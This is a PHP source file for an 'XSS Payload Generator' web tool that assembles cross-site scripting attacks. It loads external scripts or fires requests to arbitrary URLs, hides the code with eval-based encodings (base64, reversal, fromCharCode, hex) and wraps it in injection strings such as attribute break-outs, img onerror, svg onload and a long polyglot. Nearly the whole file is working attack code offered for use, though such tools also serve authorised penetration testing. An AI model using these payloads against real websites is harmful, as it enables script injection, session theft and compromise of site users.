<?php
  /**
    XSS Payload generator and dropper
  */


  /**
    Payload types
      - Request URL (img)
      - Request URL (XHR)
      - Load script ($.getScript())
      - Load script (document.createElement())
      - Dropper (multiple scripts / automatic payload)
      - JavaScript code

  */

  $aPayloads = [
    [
      "name" => "Load script ($.getScript())",
      "desc" => "Load an external script into the DOM using jQuery, if jQuery is already loaded into the DOM",
      "code" => "$.getScript(\"{url}\")",
      "fields" => "filepicker,url"
    ],
    [
      "name" => "Load script (document.createElement())",
      "desc" => "Load an external script into the DOM using native document.createElement() methods",
      "code" => "e=document.createElement(\"script\");e.src=\"{url}\";document.body.appendChild(e);",
      "fields" => "filepicker,url"
    ],
    [
      "name" => "Request URL (img)",
      "desc" => "Make a blind, cross-origin request to an arbitrary URL",
      "code" => "new Image().src=\"{url}\"",
      "fields" => "url"
    ],
    [
      "name" => "Request URL (XHR)",
      "desc" => "Make a same-origin or CORS request to an arbitrary URL",
      "code" => "x=new XMLHttpRequest();x.open(\"GET\",\"{url}\");x.send()",
      "fields" => "url"
    ],
    [
      "name" => "JavaScript code",
      "desc" => "Inject custom inline JavaScript code",
      "code" => "{js}",
      "fields" => "js"
    ]
    /*
    [
      "name" => "Dropper (multiple scripts / automatic payload)",
      "desc" => "Load a set of scripts using this dropper to determine the best payload",
      "code" => ""
    ],
    */
  ];
  
  /*
    Obfuscation
      - None
      - base64 (btoa())
      - reverse
      - String.fromCharCode()
      - character hex code
  */
  $aObfuscation = [
    [
      "name" => "None",
      "desc" => "No obfuscation",
      "code" => "{payload}"
    ],
    [
      "name" => "String eval",
      "desc" => "Pass the payload as a string into eval()",
      "code" => "eval('{payload}')"
    ],
    [
      "name" => "Base64 (atob())",
      "desc" => "Base64 encode and execute using eval()",
      "code" => "eval(atob('{payloadb64}'))"
    ],
    [
      "name" => "Reverse",
      "desc" => "Reverse payload string and execute using eval()",
      "code" => "eval('{payloadrev}'.split('').reverse().join(''))"
    ],
    [
      "name" => "String.fromCharCode()",
      "desc" => "Build payload string one char at a time using the ordinal value",
      "code" => "eval({payloadchr})"
    ],
    [
      "name" => "Character hex codes",
      "desc" => "Construct the payload using hex value of each character",
      "code" => "eval('{payloadhex}')"
    ]
  ];
  
  /*
    Injection
      - Basic polyglot / inline script
      - 0xsobky - Ultimate XSS Polyglot
      - String variable escape
      - img element onerror
      - SVG element
      - Element onclick
      - Element onmouseover
  */
  $aInjections = [
    [
      "name" => "Basic polyglot / inline script",
      "desc" => "Code execution using basic break-out technique",
      "code" => "'\"></textarea><script>{payload}</script>"
    ],
    [
      "name" => "0xsobky - Ultimate XSS Polyglot",
      "desc" => "Long, very flexible payload good for blind injection and fuzzing",
      "code" => "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk={payload} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={payload}//>\\x3e"
    ],
    [
      "name" => "String variable escape",
      "desc" => "Break out from within a string in block of JavaScript",
      "code" => "\";//';\n{payload}"
    ],
    [
      "name" => "img element onerror",
      "desc" => "Inject an invalid <img> element with the payload within onerror",
      "code" => "<img src=x onerror={payload}/>"
    ],
    [
      "name" => "SVG element",
      "desc" => "Inject an SVG element containing the payload within onload",
      "code" => "<svg onload={payload}/>"
    ],
    [
      "name" => "Element onclick",
      "desc" => "Break out of an element attribute and add an onclick event",
      "code" => "'\" onclick={payload}>"
    ],
    [
      "name" => "Element onmouseover",
      "desc"  => "Break out of an element attribute and add an onmouseover event",
      "code" => "'\" onmouseover={payload}>"
    ]
  ];
  

  // Logic for generating a payload
  function generatePayload( $form ){
    global $aPayloads, $aObfuscation, $aInjections;
    $required = ['payloadid','injectionid','obfuscationid'];
    foreach( $required as $item ){
      if( !in_array( $item, array_keys( $form ) ) ) return $item." not provided";
    }

    $rtn = [];
    $rtn['meta'] = [];
    if( !in_array( $form['payloadid'], array_keys( $aPayloads ) ) ) $form['payloadid'] = 0;
    $payload = $aPayloads[$form['payloadid']];
    $rtn['meta']['payload'] = $payload;


    // Replace values in code with form values
    $fields = explode( ",", $payload["fields"] );
    $code = $payload['code'];
    foreach( $fields as $f ){
      if( !in_array( $f, array_keys( $form ) ) ) continue;
      $code = str_replace( '{'.$f.'}', $form[$f], $code );
    }
    $rtn['payload'] = $code;

    // Prepare payloads
    $prep = [];
    $prep['payload'] = $code;
    $prep['payloadb64'] = base64_encode( $code );
    $prep['payloadrev'] = strrev( $code );
    $chrs = [];
    for( $i=0; $i<strlen($code); $i++ ){
      $chrs[] = ord( substr( $code, $i, 1 ) );
    }
    $prep['payloadchr'] = 'String.fromCharCode(' . implode( ',', $chrs ) . ')';
    $hex = '';
    for ($i = 0; $i < strlen($code); $i++) {
      $hex .= '\x' . str_pad(dechex(ord($code[$i])), 2, '0', STR_PAD_LEFT);
    }
    $prep['payloadhex'] = $hex;
    $rtn['prepared'] = $prep;

    // Obfuscate code using chosen method
    if( !in_array( $form['obfuscationid'], array_keys( $aObfuscation ) ) ) $form['obfuscationid'] = 0;
    $obfuscation = $aObfuscation[$form['obfuscationid']];
    $rtn['meta']['obfuscation'] = $obfuscation;
    $code = $obfuscation['code']; 
    foreach( $prep as $k => $v ){
      $code = str_replace( '{'.$k.'}', $v, $code );
    }
    $rtn['obfuscated'] = $code;

    // Insert into injection string
    if( !in_array( $form['injectionid'], array_keys( $aInjections ) ) ) $form['injectionid'] = 0;
    $injection = $aInjections[$form['injectionid']];
    $rtn['meta']['injection'] = $injection;
    $code = str_replace( '{payload}', $code, $injection['code'] );
    $rtn['inject'] = $code;
    return $rtn;
  }

  // Generate the actual payload
  if( $_GET['mode'] == 'ajax' ){
    header('Content-Type: text/json');
    $rtn = generatePayload( $_GET );
    echo json_encode( $rtn );
    exit;
  }
  
  // Show form to generate a payload
  if( empty( $_GET["mode"] ) || $_GET["mode"] == "generate"){
?>
<html>
<head>
<title>XSS Payload Generator</title>
<script>
function createPayload(){
  ids = 'payloadid,obfuscationid,injectionid'.split(',');
  var args = '';
  opts = [];
  for( var i=0; i<ids.length; i++ ){
    k = ids[i];
    e = document.getElementById(k);
    opts[k] = e.options[e.selectedIndex].value;
  }
  inp = document.getElementsByClassName('container');
  for( var i=0; i<inp.length; i++ ){
    inp[i].style.display = 'None';
    // console.log(inp[i]);  
  }
  switch( opts['payloadid'] ){
<?php
  foreach( $aPayloads as $id => $p ){
    echo "    case '$id':\n";
    $fields = explode( ',', $p['fields'] );
    foreach( $fields as $f ){
      echo "      f = document.getElementById('$f')\n";
      echo "      if( f.tagName == 'SELECT' ) opts['$f'] = f.options[f.selectedIndex].value;\n";
      echo "      else opts['$f'] = f.value;\n";
      echo "      e = document.getElementById('".$f."_container');\n";
      echo "      e.style.display = 'block';\n";
      echo "      console.log('show', e);\n";
    }
    echo "      break;\n";
  }
?>
  }
  url = "<?php echo $_SERVER["PHP_SELF"]; ?>?mode=ajax";
  for( var k in opts ){
    arg = "&" + k + "=" + opts[k]; 
    url = url + arg
  }
  x = new XMLHttpRequest();
  x.onreadystatechange = function(){
    if( x.readyState == 4 && x.status == 200 ){
      console.log( x.responseText );
      data = JSON.parse( x.responseText );
      document.getElementById('output').value = data['inject'];
      document.getElementById('payload_desc').innerText = data['meta']['payload']['desc'];
      document.getElementById('injection_desc').innerText = data['meta']['injection']['desc'];
      document.getElementById('obfuscation_desc').innerText = data['meta']['obfuscation']['desc'];
    }
  }
  x.open('GET',url);
  x.send();
}
function setUrl(){
  f = document.getElementById('filepicker');
  u = document.getElementById('url');
  u.value = f.options[f.selectedIndex].value;
  u.onchange();
}
function initForm(){
  tags = "input,select".split(',');
  console.log( tags );
  for(var j=0; j<tags.length; j++){
    opts = document.getElementsByTagName(tags[j]);
    for( var i=0; i<opts.length; i++ ){
      console.log(opts[i]);
      opts[i].onchange = createPayload;
    }
  }
  document.getElementById('filepicker').onchange = setUrl;
  createPayload();
}
window.onload = initForm;
</script>
<style>
  body {
    font-family: Trebuchet, sans-serif;
  }
  label {
    display: block;
    margin-top: 1em;
  }
  textarea {
    width: 50em;
    height: 30em;
  }
  select, input {
    width: 50em;
  }
  div.desc {
    font-size: 80%;
  }
</style>
</head>
<body>
<h1>XSS Payload Generator</h1>
<form>
  <div>
    <label for="payloadid">Payload</label>
    <select id="payloadid">
<?php
  foreach( $aPayloads as $id => $item ){
    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
  }
?>
    </select>
    <div id="payload_desc" class="desc"></div>
  </div>
  <div id="filepicker_container" class="container">
    <label for="filepicker">Built-in script</label>
    <select id="filepicker">
      <option value=""></option>
<?php
  $baseurl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'].dirname($_SERVER['REQUEST_URI']);
  foreach( scandir('.') as $f ){
    if( !preg_match( "/\.(php|js)$/", $f ) ) continue;
    echo "      <option value=\"".$baseurl."/".$f."\">$f</option>\n";
  }
?>
    </select>
  </div>
  <div id="url_container" class="container">
    <label for="url">URL:</label>
    <input type="text" id="url"/>
  </div>
  <div id="js_container" class="container">
    <label for="js">Custom Payload:</label>
    <input type="text" id="js" value="alert('I only write lame PoCs')"/>
  </div>
  <div>
    <label for="obfuscationid">Obfuscation</label>
    <select id="obfuscationid">
<?php
  foreach( $aObfuscation as $id => $item ){
    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
  }
?>
    </select>
    <div id="obfuscation_desc" class="desc"></div>
  </div>
  <div>
    <label for="injectionid">Injection type</label>
    <select id="injectionid">
<?php
  foreach( $aInjections as $id => $item ){
    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
  }
?>
    </select>
    <div id="injection_desc" class="desc"></div>
  </div>
  <div>
    <label for="output">Output</label>
    <textarea id="output"></textarea>
  </div>
</form>

<?php
  }
?>
